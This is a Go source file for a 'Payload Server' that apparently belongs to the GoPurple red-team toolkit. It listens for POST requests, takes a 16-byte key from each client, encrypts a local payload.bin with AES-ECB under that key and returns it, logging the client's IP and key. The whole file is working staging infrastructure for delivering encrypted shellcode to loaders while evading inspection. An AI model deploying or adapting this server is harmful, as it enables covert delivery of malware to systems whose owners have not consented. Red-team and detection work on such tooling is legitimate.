package main

import (
	"flag"
	"fmt"
	"github.com/sh4hin/GoPurple/helpers"
	"log"
	"net/http"
	"os"
	"strings"
)

type ServerConfig struct {
	ListenPort     int
	PayloadBinFile string
}

const EncodeKeySize = 16

var defaultConfig ServerConfig

func indexHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != "POST" {
		return
	}

	clientIP := strings.Split(r.RemoteAddr, ":")[0]
	buf := make([]byte, 1024)
	n, _ := r.Body.Read(buf)
	if n < EncodeKeySize {
		log.Printf("[-]Client %s Keys too short：%d \n", clientIP, n)
		return
	}
	payloadBin, err := os.ReadFile(defaultConfig.PayloadBinFile)
	if err != nil {
		log.Printf("[-]Read local payload file:%s fail \n", defaultConfig.PayloadBinFile)
		return
	}
	payloadBinEncoded := helpers.AesEncryptECB(payloadBin, buf[0:EncodeKeySize])
	w.Write(payloadBinEncoded)
	log.Printf("[+]Send Payload finish! ClientIP: %s, Key:%s", clientIP, string(buf[0:EncodeKeySize]))
}
func Usage() {
	fmt.Println("Payload Server by AESencrypt for GoPurple!")
	flag.PrintDefaults()
}
func main() {
	flag.IntVar(&defaultConfig.ListenPort, "port", 9000, "Server listening port")
	flag.StringVar(&defaultConfig.PayloadBinFile, "payload", "./payload.bin", "Payload bin file")
	flag.Usage = Usage
	flag.Parse()
	_, err := os.ReadFile(defaultConfig.PayloadBinFile)
	if err != nil {
		log.Fatal(fmt.Sprintf("[-]Read payload bin file:%s fail!", defaultConfig.PayloadBinFile))
	}
	log.Printf("[+]Payload Server listening in port %d...\n", defaultConfig.ListenPort)
	http.HandleFunc("/", indexHandler)
	log.Fatal(http.ListenAndServe(fmt.Sprintf(":%d", defaultConfig.ListenPort), nil))
}
